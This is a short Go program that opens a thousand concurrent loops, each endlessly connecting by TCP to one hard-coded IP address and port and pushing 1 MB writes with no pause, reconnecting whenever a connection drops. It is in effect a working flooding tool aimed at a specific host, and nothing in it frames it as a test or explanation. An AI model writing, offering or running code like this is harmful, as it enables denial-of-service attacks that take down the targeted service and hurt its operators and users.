package main

import (
	"net"
	"sync"
)

func main() {
	var wg sync.WaitGroup
	data := make([]byte, 1024*1024) // 1 MB of data

	for i := 0; i < 1000; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				conn, err := net.Dial("tcp", "185.107.193.52:45028")
				if err != nil {
					continue // if connection fails, retry
				}
				for {
					_, err := conn.Write(data) // Send 1 MB of data
					if err != nil {
						conn.Close()
						break // if write fails, close and open a new connection
					}
				}
			}
		}()
	}

	wg.Wait()
}
